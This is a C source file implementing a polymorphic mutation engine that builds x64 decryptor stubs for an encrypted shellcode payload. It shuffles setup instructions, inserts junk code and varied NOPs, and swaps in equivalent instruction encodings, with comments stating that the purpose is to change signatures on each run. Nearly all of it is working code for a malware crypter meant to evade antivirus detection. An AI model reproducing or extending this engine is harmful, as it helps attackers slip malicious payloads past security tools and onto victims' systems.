/*
 * ==========================================================================
 *  MutationEngine.c – Polymorphic mutation engine – implementation
 * ==========================================================================
 *
 *  This file implements the heart of the polymorphic engine.
 *  It operates on raw x64 BYTES, modifying the decryptor template
 *  (DecryptorStub.asm) so that each run produces different machine code.
 *
 *  TEMPLATE ARCHITECTURE (DecryptorStub.asm):
 *  ------------------------------------------
 *  The template consists of the following parts (offsets in bytes):
 *
 *  [0..4]   – mov edx, imm32            (5B) – Block B: payload length
 *  [5..7]   – xor r9d, r9d              (3B) – Block C: zeroing index
 *  [8..11]  – mov al, [rcx+r9]          (4B) – loading byte
 *  [12..13] – xor al, KEY4              (2B) – decryptor step 4'
 *  [14..15] – sub al, KEY3              (2B) – decryptor step 3'
 *  [16..18] – ror al, ROT_BITS          (3B) – decryptor step 2'
 *  [19..20] – xor al, KEY1              (2B) – decryptor step 1'
 *  [21..24] – mov [rcx+r9], al          (4B) – storing byte
 *  [25..27] – inc r9                    (3B) – incrementing
 *  [28..30] – cmp rdx, r9              (3B) – comparing
 *  [31..32] – jne loop                  (2B) – loop jump
 *  [33]     – ret                       (1B) – return to Stub.cpp
 *
 *  Total template size: 34 bytes
 *
 *  RCX = payload pointer passed by Stub.cpp caller (Windows x64 ABI first arg).
 *  Block A (lea rcx, [rip+disp32]) removed — decryptor and payload live in
 *  separate allocations, eliminating the RWX requirement entirely.
 *
 *  PLACEHOLDERS (0xCC bytes):
 *    Offset 1  in mov edx – PAYLOAD_LEN (4 bytes: 0xCCCCCCCC)
 *    Offset 12 in xor al  – KEY4 (1 byte: 0xCC)
 *    Offset 14 in sub al  – KEY3 (1 byte: 0xCC)
 *    Offset 17 in ror al  – ROT_BITS (1 byte: 0xCC)
 *    Offset 19 in xor al  – KEY1 (1 byte: 0xCC)
 * ==========================================================================
 */

#include "MutationEngine.h"
#include <intrin.h>
#include <stdlib.h>
#include <string.h>

/* ============================================================
 *  DECRYPTOR TEMPLATE – imported from DecryptorStub.asm
 * ============================================================ */
extern BYTE DecryptorStubBegin[];
extern BYTE DecryptorStubEnd[];

/* ============================================================
 *  STABLE OFFSETS in the template (used when copying blocks)
 * ============================================================ */
#define TMPL_BLOCK_B_OFF 0 /* mov edx – 5 bytes */
#define TMPL_BLOCK_B_SIZE 5
#define TMPL_BLOCK_B_IMM 1 /* offset imm32 inside block B */

#define TMPL_BLOCK_C_OFF 5 /* xor r9d – 3 bytes */
#define TMPL_BLOCK_C_SIZE 3

/* ============================================================
 *  SETUP BLOCKS – independent instruction blocks in the setup part
 *
 *  Blocks B (mov edx) and C (xor r9d) are INDEPENDENT –
 *  they don't refer to each other's results. Therefore we can
 *  freely permute them to change signatures.
 *  (Block A removed – RCX is now passed by the caller.)
 * ============================================================ */
typedef struct _SETUP_BLOCK {
  BYTE bytes[8]; /* instruction bytes (max 7 B + padding)  */
  int len;       /* actual length in bytes                 */
} SETUP_BLOCK;

/* ============================================================
 *  MULTI-BYTE NOP – various NOP instruction variants
 *
 *  The x64 processor recognizes many different NOP forms:
 *  - 1-byte: 0x90 (classic NOP)
 *  - 2-byte: 0x66 0x90 (NOP with operand-size prefix)
 *  - 3-byte: 0x0F 0x1F 0x00 (official multi-byte NOP)
 *  - up to 9 bytes
 *
 *  We use various variants so that even NOPs look different
 *  in subsequent mutations.
 * ============================================================ */
static const BYTE NOP_1[] = {0x90};
static const BYTE NOP_2[] = {0x66, 0x90};
static const BYTE NOP_3[] = {0x0F, 0x1F, 0x00};
static const BYTE NOP_4[] = {0x0F, 0x1F, 0x40, 0x00};
static const BYTE NOP_5[] = {0x0F, 0x1F, 0x44, 0x00, 0x00};

static const BYTE *NOP_TABLE[] = {NOP_1, NOP_2, NOP_3, NOP_4, NOP_5};
static const int NOP_SIZES[] = {1, 2, 3, 4, 5};
#define NOP_VARIANT_COUNT 5

/* ============================================================
 *  JUNK CODE – "dead" instructions (not affecting state)
 *
 *  Junk code are instructions that the processor executes,
 *  but they don't change any registers/flags we use.
 *  Example: push rax + pop rax – saves and immediately
 *  restores the same register – net effect: zero.
 *
 *  We insert them randomly to "dilute" real instruction
 *  signatures and change code size.
 * ============================================================ */
typedef struct _JUNK_INSTR {
  const BYTE *bytes;
  int len;
} JUNK_INSTR;

/* push rbx; pop rbx (net effect: nothing, rbx unchanged) */
static const BYTE JUNK_PUSH_POP_RBX[] = {0x53, 0x5B};
/*
 * NOTE: We do NOT use push rax / pop rax as junk code!
 * AL is part of RAX and stores a byte during decryption.
 * push rax + pop rax inside the loop could overwrite AL if
 * something between them modified the stack.
 * It's safer to avoid registers that are "live" (in use).
 */
/* xchg rbx, rbx (swap rbx with itself = nothing) */
static const BYTE JUNK_XCHG_RBX[] = {0x48, 0x87, 0xDB};
/* lea rbx, [rbx] (rbx = rbx, i.e., nothing) */
static const BYTE JUNK_LEA_RBX[] = {0x48, 0x8D, 0x1B};
/* nop (classic) */
static const BYTE JUNK_NOP[] = {0x90};
/* mov rbx, rbx (nothing) */
static const BYTE JUNK_MOV_RBX_RBX[] = {0x48, 0x89, 0xDB};

static const JUNK_INSTR JUNK_TABLE[] = {
    {JUNK_PUSH_POP_RBX, 2}, {JUNK_XCHG_RBX, 3},    {JUNK_LEA_RBX, 3},
    {JUNK_NOP, 1},          {JUNK_MOV_RBX_RBX, 3},
};
#define JUNK_COUNT 5

/* ============================================================
 *  INSTRUCTION EQUIVALENCE – equivalent instructions
 *
 *  Instead of "xor al, imm8" we can use another instruction
 *  sequence that gives the SAME result. Example:
 *
 *    xor al, K  <==>  not al ; and al, ~K ; ... (different variants)
 *    sub al, K  <==>  add al, (256-K)  (because arithmetic mod 256)
 *    ror al, N  <==>  shl al, (8-N) ; shr + or (emulate rotation)
 *
 *  These equivalences are used RANDOMLY – each run can use
 *  a different variant, changing signatures.
 * ============================================================ */

/* ---------- XOR al, imm8 variant ---------- */

/*
 * EmitXorAlImm8_Variant1: standard "xor al, imm8"
 * Machine code: 34 <imm8>
 */
static int EmitXorAlImm8_V1(BYTE *out, BYTE imm8) {
  out[0] = 0x34;
  out[1] = imm8;
  return 2;
}

/*
 * EmitXorAlImm8_Variant2: emulation via push/mov/xor/pop
 *
 * Uses preserved register rbx to store the key:
 *   push rbx
 *   mov bl, imm8
 *   xor al, bl
 *   pop rbx
 * Gives the same result, but changes the opcode (xor al, reg instead of xor al, imm8).
 */
static int EmitXorAlImm8_V2(BYTE *out, BYTE imm8) {
  /* push rbx */
  out[0] = 0x53;
  /* mov bl, imm8 */
  out[1] = 0xB3;
  out[2] = imm8;
  /* xor al, bl */
  out[3] = 0x30;
  out[4] = 0xD8;
  /* pop rbx */
  out[5] = 0x5B;
  return 6;
}

/*
 * EmitXorAlImm8_Variant3: emulation via helper register R11B
 *
 * Register R11 is "caller-saved", and we don't store any
 * important state in it in the template, so we can use it
 * freely without push/pop:
 *
 *   mov r11b, imm8
 *   xor al, r11b
 *
 * Changes the instructions used (e.g., requires REX.R and REX.B prefixes).
 */
static int EmitXorAlImm8_V3(BYTE *out, BYTE imm8) {
  /* Use r11 which is caller-saved and not used in the stub */
  /* mov r11b, imm8 */
  out[0] = 0x41; /* REX.B – extends R/M field in B0+rb: BL -> R11B */
  out[1] = 0xB3;
  out[2] = imm8;
  /* xor al, r11b */
  out[3] = 0x44; /* REX.R – extends REG field in ModRM: BL -> R11B */
  out[4] = 0x30; /* XOR r/m8, r8 */
  out[5] = 0xD8; /* ModRM: mod=11, reg=011(R11B z REX.R), r/m=000(AL) */
  return 6;
}

/* ---------- SUB al, imm8 variant ---------- */

/*
 * EmitSubAlImm8_V1: standard "sub al, imm8"
 * Machine code: 2C <imm8>
 */
static int EmitSubAlImm8_V1(BYTE *out, BYTE imm8) {
  out[0] = 0x2C;
  out[1] = imm8;
  return 2;
}

/*
 * EmitSubAlImm8_V2: "add al, (256 - imm8)"
 * Works because: sub al, K == add al, (-K mod 256) == add al, (256-K)
 * Arithmetic mod 256 ensures both give the identical result.
 */
static int EmitSubAlImm8_V2(BYTE *out, BYTE imm8) {
  out[0] = 0x04;             /* add al, imm8 */
  out[1] = (BYTE)(0 - imm8); /* 256 - imm8 (mod 256) = complement */
  return 2;
}

/*
 * EmitSubAlImm8_V3: "neg; add al, (~imm8 + 1)" via push/pop trick
 *   push rbx; mov bl, imm8; sub al, bl; pop rbx
 */
static int EmitSubAlImm8_V3(BYTE *out, BYTE imm8) {
  out[0] = 0x53; /* push rbx */
  out[1] = 0xB3;
  out[2] = imm8; /* mov bl, imm8 */
  out[3] = 0x28;
  out[4] = 0xD8; /* sub al, bl */
  out[5] = 0x5B; /* pop rbx */
  return 6;
}

/* ---------- ROR al, imm8 variant ---------- */

/*
 * EmitRorAlImm8_V1: standard "ror al, imm8"
 * Machine code: C0 C8 <imm8>
 */
static int EmitRorAlImm8_V1(BYTE *out, BYTE imm8) {
  out[0] = 0xC0;
  out[1] = 0xC8;
  out[2] = imm8;
  return 3;
}

/*
 * EmitRorAlImm8_V2: emulation of ROR using ROL with complementary shift
 * ror al, N  <==>  rol al, (8 - N)
 * Machine code: C0 C0 <8-imm8>
 */
static int EmitRorAlImm8_V2(BYTE *out, BYTE imm8) {
  out[0] = 0xC0;
  out[1] = 0xC0;                   /* rol al, imm8 */
  out[2] = (BYTE)(8 - (imm8 & 7)); /* complementary shift */
  return 3;
}

/*
 * EmitRorAlImm8_V3: emulation via helper rcx/r11 and ror r/m, cl
 *
 * The `ror r/m, cl` instruction takes the CL register as the shift amount.
 *   mov r11b, imm8
 *   push rcx         (save rcx from the original address)
 *   mov cl, r11b
 *   ror al, cl
 *   pop rcx          (restore address in rcx)
 */
static int EmitRorAlImm8_V3(BYTE *out, BYTE imm8) {
  /* Note: rcx is used as a pointer! We'll use r11 */
  /* mov r11b, imm8 */
  out[0] = 0x41;
  out[1] = 0xB3;
  out[2] = imm8;
  /* push rcx; save */
  out[3] = 0x51;
  /* mov cl, r11b */
  out[4] = 0x44;
  out[5] = 0x88;
  out[6] = 0xD9;
  /* ror al, cl */
  out[7] = 0xD2;
  out[8] = 0xC8;
  /* pop rcx; restore */
  out[9] = 0x59;
  return 10;
}

/* ============================================================
 *  Helper: EmitBytes – copies bytes to the output buffer
 *  and returns the new position (offset) after the copied bytes.
 * ============================================================ */
static int EmitBytes(BYTE *out, int offset, const BYTE *src, int len) {
  memcpy(out + offset, src, len);
  return offset + len;
}

/* ============================================================
 *  Helper: InsertRandomJunk – inserts 0-2 random junk instructions
 *  at the current position in the output buffer.
 *
 *  Returns the new offset (after the inserted instructions).
 * ============================================================ */
static int InsertRandomJunk(BYTE *out, int offset) {
  /* Random number of junk instructions: 0, 1 or 2 */
  int count = rand() % 3;
  for (int i = 0; i < count; i++) {
    int idx = rand() % JUNK_COUNT;
    memcpy(out + offset, JUNK_TABLE[idx].bytes, JUNK_TABLE[idx].len);
    offset += JUNK_TABLE[idx].len;
  }
  return offset;
}

/* ============================================================
 *  Helper: InsertRandomNop – inserts a random multi-byte NOP
 *  or does not insert anything (50% chance for NOP).
 *
 *  Returns the new offset.
 * ============================================================ */
static int InsertRandomNop(BYTE *out, int offset) {
  if (rand() % 2 == 0) {
    int idx = rand() % NOP_VARIANT_COUNT;
    memcpy(out + offset, NOP_TABLE[idx], NOP_SIZES[idx]);
    offset += NOP_SIZES[idx];
  }
  return offset;
}

/* ============================================================
 *  MutateDecryptor() – main mutation function
 *
 *  Algorithm:
 *  ---------
 *  1. Copy 3 setup blocks (A, B, C) from the template
 *  2. Randomly PERMUTE them (A,B,C -> B,C,A -> ...)
 *  3. Insert junk code between blocks
 *  4. Emit decryption loop instructions, randomly choosing
 *     equivalent variants for each cipher instruction
 *  5. Insert NOPs and junk code between instructions
 *  6. Calculate and patch: payload offset (lea rcx), length (mov edx),
 *     keys (KEY1-KEY4, ROT_BITS), loop jump (jne)
 *  7. Append encrypted payload at the end
 * ============================================================ */
BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
                     const COMPOUND_KEY *pKey, PMUTATED_SHELLCODE pOut) {
  /*
   * Working buffer – allocate much more than needed,
   * because mutation can increase the stub size (junk code, NOPs,
   * longer instruction equivalents). 4x should be enough.
   */
  SIZE_T originalStubSize = (SIZE_T)(DecryptorStubEnd - DecryptorStubBegin);

  /* Verify the template bytes we are about to copy/patch match the expected
   * opcodes.  If MASM changes instruction encoding (e.g. after a toolchain
   * update), this catches the mismatch at build time instead of silently
   * producing a broken decryptor stub.
   *
   * Block B @ TMPL_BLOCK_B_OFF=0: mov edx, imm32  → first byte must be 0xBA
   * Block C @ TMPL_BLOCK_C_OFF=5: xor r9d, r9d   → first byte must be 0x45 (REX.B) */
  if (originalStubSize < 8 ||
      DecryptorStubBegin[TMPL_BLOCK_B_OFF] != 0xBA ||
      DecryptorStubBegin[TMPL_BLOCK_C_OFF] != 0x45) {
      HeapFree(GetProcessHeap(), 0, NULL); /* no-op, just symmetrical with alloc path */
      return FALSE; /* Template mismatch — update TMPL_BLOCK_*_OFF constants */
  }

  SIZE_T maxStubSize = originalStubSize * 4 + 256;
  SIZE_T bufSize = maxStubSize + payloadLen;
  BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);
  if (!buf)
    return FALSE;

  /* Seed RNG for this run */
  srand((unsigned int)(__rdtsc() & 0xFFFFFFFF));

  int pos = 0; /* current write position in output buffer */

  /* ===========================================================
   *  STEP 1 & 2: Extract setup blocks and randomly PERMUTE them
   *
   *  Block B (5B): mov edx, imm32  – payload length
   *  Block C (3B): xor r9d, r9d   – index = 0
   *
   *  RCX (payload pointer) is passed by the caller — Block A removed.
   *  Permutation: 2! = 2 possible orders [B,C] or [C,B].
   * =========================================================== */
  SETUP_BLOCK blocks[2];

  /* Block B: mov edx, imm32 – 5 bytes */
  memcpy(blocks[0].bytes, DecryptorStubBegin + TMPL_BLOCK_B_OFF,
         TMPL_BLOCK_B_SIZE);
  blocks[0].len = TMPL_BLOCK_B_SIZE;

  /* Block C: xor r9d, r9d – 3 bytes */
  memcpy(blocks[1].bytes, DecryptorStubBegin + TMPL_BLOCK_C_OFF,
         TMPL_BLOCK_C_SIZE);
  blocks[1].len = TMPL_BLOCK_C_SIZE;

  /* Fisher-Yates shuffle */
  int order[2] = {0, 1};
  for (int i = 1; i > 0; i--) {
    int j = rand() % (i + 1);
    int tmp = order[i];
    order[i] = order[j];
    order[j] = tmp;
  }

  /*
   * Track offset of Block B so we can patch imm32 (payload length) later.
   * Block A (disp32) no longer exists.
   */
  int blockB_imm_offset = -1;  /* offset imm32 in mov edx */

  /* Emit blocks in random order with junk in between */
  for (int i = 0; i < 2; i++) {
    int idx = order[i];

    /* Insert junk before the block (except the first one) */
    if (i > 0) {
      pos = InsertRandomJunk(buf, pos);
      pos = InsertRandomNop(buf, pos);
    }

    /* Remember the offset of imm32 inside Block B */
    if (idx == 0) {
      blockB_imm_offset = pos + 1; /* imm32 starts 1B from the beginning of mov */
    }

    /* Emit block */
    memcpy(buf + pos, blocks[idx].bytes, blocks[idx].len);
    pos += blocks[idx].len;
  }

  /* ===========================================================
   *  STEP 3: Junk code before the loop
   * =========================================================== */
  pos = InsertRandomJunk(buf, pos);

  /* ===========================================================
   *  STEP 4: Emit decryption loop with random equivalents
   *
   *  Remember the offset of the beginning of the loop, because the JNE
   *  instruction at the end must jump exactly here.
   * =========================================================== */
  int loopStartOffset = pos;

  /* --- mov al, [rcx + r9] (loading the encrypted byte) --- */
  /* This instruction has no simple equivalent, we copy it directly */
  buf[pos++] = 0x42;
  buf[pos++] = 0x8A;
  buf[pos++] = 0x04;
  buf[pos++] = 0x09;

  pos = InsertRandomNop(buf, pos);

  /* --- Step 4': xor al, KEY4 (undo XOR) --- */
  {
    int variant = rand() % 3;
    int emitted = 0;
    switch (variant) {
    case 0:
      emitted = EmitXorAlImm8_V1(buf + pos, pKey->key4);
      break;
    case 1:
      emitted = EmitXorAlImm8_V2(buf + pos, pKey->key4);
      break;
    default:
      emitted = EmitXorAlImm8_V3(buf + pos, pKey->key4);
      break;
    }
    pos += emitted;
  }

  pos = InsertRandomNop(buf, pos);

  /* --- Step 3': sub al, KEY3 (undo ADD) --- */
  {
    int variant = rand() % 3;
    int emitted = 0;
    switch (variant) {
    case 0:
      emitted = EmitSubAlImm8_V1(buf + pos, pKey->key3);
      break;
    case 1:
      emitted = EmitSubAlImm8_V2(buf + pos, pKey->key3);
      break;
    default:
      emitted = EmitSubAlImm8_V3(buf + pos, pKey->key3);
      break;
    }
    pos += emitted;
  }

  pos = InsertRandomNop(buf, pos);

  /* --- Step 2': ror al, ROT_BITS (undo ROL) --- */
  {
    int variant = rand() % 3;
    int emitted = 0;
    switch (variant) {
    case 0:
      emitted = EmitRorAlImm8_V1(buf + pos, pKey->rotBits);
      break;
    case 1:
      emitted = EmitRorAlImm8_V2(buf + pos, pKey->rotBits);
      break;
    default:
      emitted = EmitRorAlImm8_V3(buf + pos, pKey->rotBits);
      break;
    }
    pos += emitted;
  }

  pos = InsertRandomNop(buf, pos);

  /* --- Step 1': xor al, KEY1 (undo XOR) --- */
  {
    int variant = rand() % 3;
    int emitted = 0;
    switch (variant) {
    case 0:
      emitted = EmitXorAlImm8_V1(buf + pos, pKey->key1);
      break;
    case 1:
      emitted = EmitXorAlImm8_V2(buf + pos, pKey->key1);
      break;
    default:
      emitted = EmitXorAlImm8_V3(buf + pos, pKey->key1);
      break;
    }
    pos += emitted;
  }

  pos = InsertRandomNop(buf, pos);

  /* --- mov [rcx + r9], al (writing the decrypted byte) --- */
  buf[pos++] = 0x42;
  buf[pos++] = 0x88;
  buf[pos++] = 0x04;
  buf[pos++] = 0x09;

  /* --- inc r9 --- */
  buf[pos++] = 0x49;
  buf[pos++] = 0xFF;
  buf[pos++] = 0xC1;

  /* --- cmp rdx, r9 --- */
  buf[pos++] = 0x4C;
  buf[pos++] = 0x39;
  buf[pos++] = 0xCA;

  /* --- jne decrypt_loop --- */
  /*
   * JNE (0x75 rel8) – jump backwards to loopStartOffset.
   * rel8 = target - (current + 2)  [+2 because the instruction itself has 2 bytes]
   * The result will be negative (backward jump) and must fit in a signed byte
   * (-128..+127).
   */
  int jnePos = pos;
  int rel8 = loopStartOffset - (jnePos + 2);

  /* Check if the jump fits in a signed byte */
  if (rel8 < -128 || rel8 > 127) {
    /* Loop too long for short jump – should not happen,
       but just in case – fallback to near jump */
    buf[pos++] = 0x0F;
    buf[pos++] = 0x85; /* jne rel32 */
    int rel32 = loopStartOffset - (pos + 4);
    memcpy(buf + pos, &rel32, 4);
    pos += 4;
  } else {
    buf[pos++] = 0x75;
    buf[pos++] = (BYTE)(rel8 & 0xFF);
  }

  /* --- ret (return immediately to Stub.exe after decryption) --- */
  buf[pos++] = 0xC3;

  /* ===========================================================
   *  STEP 5: Patching offsets and keys
   * =========================================================== */

  /* Size of the mutated stub (before adding the payload) */
  int mutatedStubSize = pos;

  /* Patch Block B: imm32 in "mov edx, imm32" = payload length */
  if (blockB_imm_offset >= 0) {
    DWORD payloadLen32 = (DWORD)payloadLen;
    memcpy(buf + blockB_imm_offset, &payloadLen32, 4);
  }

  /* ===========================================================
   *  STEP 6: Append encrypted payload after the stub
   * =========================================================== */
  memcpy(buf + mutatedStubSize, pEncPayload, payloadLen);

  /* ===========================================================
   *  STEP 7: Fill the output structure
   * =========================================================== */
  pOut->pBuffer = buf;
  pOut->stubSize = (SIZE_T)mutatedStubSize;
  pOut->totalSize = (SIZE_T)mutatedStubSize + payloadLen;

  return TRUE;
}
